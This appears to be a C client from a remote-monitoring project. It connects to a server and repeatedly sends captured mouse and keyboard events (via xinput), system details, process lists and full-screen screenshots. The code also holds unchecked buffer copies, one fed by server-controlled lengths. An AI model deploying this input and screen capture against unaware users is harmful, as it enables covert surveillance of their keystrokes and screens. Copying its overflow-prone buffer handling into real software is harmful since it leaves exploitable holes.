#include <stdio.h>          /* These are the usual header files */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <stdlib.h>
#include <libgen.h>
#include "cjson/cJSON.h"
#include "message.h"

#define BUFF_SIZE 1024
#define TMP_INFO "info.txt"
#define TMP_IMAGE "image.png"
#define TMP_OPERATION "event.txt"
#define TMP_PROCESSING "log.txt"
#define MAX_LENGTH 256

int time_wait = 10;


/*  int sendFile(int opcode,char* filename, int client_sock)
    ---------------------------------------------------------------------------
    TODO   : > Send "filename" to server  
    ---------------------------------------------------------------------------
    INPUT  : - int opcode       [Opcode of message]
    		 - char* filename       [Name of file which will send]
    		 - int client_sock		[client will be sent]
    OUTPUT : + return -1       	[Failed to open file]
    		 + return -2		[Reading error]
			 + return -3		[Send file error]
			 + return 0			[Send file success]
*/
int sendFile(int opcode, char* filename, int client_sock)
{
	int lSize, bytes_sent, byte_read;
    char buff[BUFF_SIZE];
    char *mess;

	FILE *fp = fopen(filename, "rb");
	if (fp == NULL) {
        fprintf(stderr, "Failed to open file.\n");
        return -1;
    }
	// obtain file size:
	fseek (fp , 0 , SEEK_END);
	lSize = ftell (fp);
	rewind (fp);
	bzero(buff, BUFF_SIZE);
	while(lSize > 0) {
		if (lSize > BUFF_SIZE) {
			byte_read = fread (buff,1,BUFF_SIZE,fp);
  			if (byte_read != BUFF_SIZE) {fputs ("Reading error",stderr); return -2;}
		} else {
			byte_read = fread (buff,1,lSize,fp);
			if (byte_read != lSize) {fputs ("Reading error",stderr); return -2;}
		}
		// Sent message with opcode = 0: Send all infomation of client's computer
		mess = makeMessage(opcode, byte_read, buff);
		bytes_sent = send(client_sock, mess, BUFF_SIZE+5, 0);
		free(mess);
		if(bytes_sent <= 0){
			printf("Error: Connection closed.\n");
			return -3;
		}
		lSize -= byte_read;
		if (lSize <=0) {
			mess = makeMessage(opcode, 0, "");
			// Sent message with opcode = 0: Send all infomation of client's computer
			bytes_sent = send(client_sock, mess, BUFF_SIZE + 5, 0);
			free(mess);
			if(bytes_sent <= 0){
				printf("Error: Connection closed.\n");
				return -3;
			}
		}
	}
	fclose(fp);
	remove(filename);
	return 0;	
}

/*  int sendAll(int client_sock)
    ---------------------------------------------------------------------------
    TODO   : > Run some command to make file data and send them to server 
    ---------------------------------------------------------------------------
    INPUT  : - int client_sock		[server will be sent]
    OUTPUT : + return -1       	[Failed to send file mouse and keyboard log]
    		 + return -2		[Failed to send file infomation]
			 + return -3		[Failed to send file processing]
			 + return -4		[Failed to send file image]
			 + return 0			[Send all file success]
*/
int sendAll(int client_sock)
{
	char command[BUFF_SIZE];
	sprintf(command,"xinput --test-xi2 --root > %s & sleep %d ; kill $!", TMP_OPERATION, time_wait);
    system(command);
    if (sendFile(2, TMP_OPERATION, client_sock) != 0) {
    	fprintf(stderr, "Sending mouse and keyboard operations is wrong.\n");
    	remove(TMP_OPERATION);
    	return -1;
    }
	sprintf(command,"lscpu > %s", TMP_INFO);
    system(command);
    if (sendFile(0, TMP_INFO, client_sock) != 0) {
    	fprintf(stderr, "Sending infomation is wrong.\n");
    	remove(TMP_INFO);
    	return -2;
    }

    sprintf(command,"top -b -n1 | head -n 50 > %s", TMP_PROCESSING);
    system(command);
    if (sendFile(1, TMP_PROCESSING, client_sock) != 0) {
    	fprintf(stderr, "Sending processing is wrong.\n");
    	remove(TMP_PROCESSING);
    	return -3;
    }
    sprintf(command,"import -window root %s", TMP_IMAGE);
    system(command);
    if (sendFile(3, TMP_IMAGE, client_sock) != 0) {
    	fprintf(stderr, "Sending image is wrong.\n");
    	remove(TMP_IMAGE);
    	return -4;
    }
    return 0;
}


/*  int setTimeWait(char *payload,int length)
    ---------------------------------------------------------------------------
    TODO   : > Set time_wait for this system
    ---------------------------------------------------------------------------
    INPUT  : - int client_sock		[client will be sent]
    OUTPUT : + return -1			[Error]
    		 + return 0				[Success]
*/
int setTimeWait(char *payload,int length)
{
	char timeWait[10];
	int time;
	memcpy(timeWait, payload, length);
	timeWait[length] = 0;
	time = atoi(timeWait);
	if (time <= 0 || time >= 4294967296) return -1;
	time_wait = time;
    return 0;
}

/*  int receive(int client_sock)
    ---------------------------------------------------------------------------
    TODO   : > Receive message from server
    ---------------------------------------------------------------------------
    INPUT  : - int client_sock		[client will be sent]
    OUTPUT : + return -1			[Error]
    		 + return 0				[Success]
*/
int receive(int client_sock) {
	int bytes_received;
	int opcode, length;
	char payload[BUFF_SIZE];
	char buff[BUFF_SIZE+5];
	bytes_received = recv(client_sock, buff, BUFF_SIZE + 5, MSG_DONTWAIT);
	if (bytes_received <= 0) {
		return 0;
	}
	parseMess(buff, &opcode, &length, payload);
	switch(opcode) {
		case 4: 										
			setTimeWait(payload, length);		// Change time_wait
			break;
		case 5:
			return -1;
			break;
	}
	return 0;
}

/*  int sendError(int client_sock)
    ---------------------------------------------------------------------------
    TODO   : > Send error from client to server
    ---------------------------------------------------------------------------
    INPUT  : - int client_sock		[client will be sent]
    OUTPUT : + return -1			[Connection closed]
    		 + return 0				[Success]
*/
int sendError(int client_sock) {
	char *mess;
	int bytes_sent;
	mess = makeMessage(5, 0, "");
	bytes_sent = send(client_sock, mess, BUFF_SIZE+5, 0);
	free(mess);
	if(bytes_sent <= 0){
		printf("Error: Connection closed.\n");
		return -1;
	}
	return 0;
}

int main(int argc, char *argv[]){
	if (argc <= 2) {
		printf("The argument is error.\n");
		return 1;
	}
	char server_address[100] = "";
	strcpy(server_address, argv[1]);
	int server_port = atoi(argv[2]);
	int client_sock;
	struct sockaddr_in server_addr; /* server's address information */

	//Step 1: Construct socket
	client_sock = socket(AF_INET,SOCK_STREAM,0);
	
	//Step 2: Specify server address
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_address);
	
	//Step 3: Request to connect server
	if(connect(client_sock, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)) < 0){
		printf("\nError!Can not connect to sever! Client exit imediately! ");
		return 0;
	}
	// pthread_create(&tid, NULL, &mouse_and_keyboard, NULL);
	//Step 4: Communicate with server
	while (1) {	
		if (receive(client_sock) != 0) {
			fprintf(stderr, "Receiving is wrong.\n");
			sendError(client_sock);
			break;
		}

		if (sendAll(client_sock) != 0) {
			fprintf(stderr, "Sending is wrong.\n");
			sendError(client_sock);
			break;
		}
	}

	// Step 4: Close socket
	close(client_sock);
	return 0;
}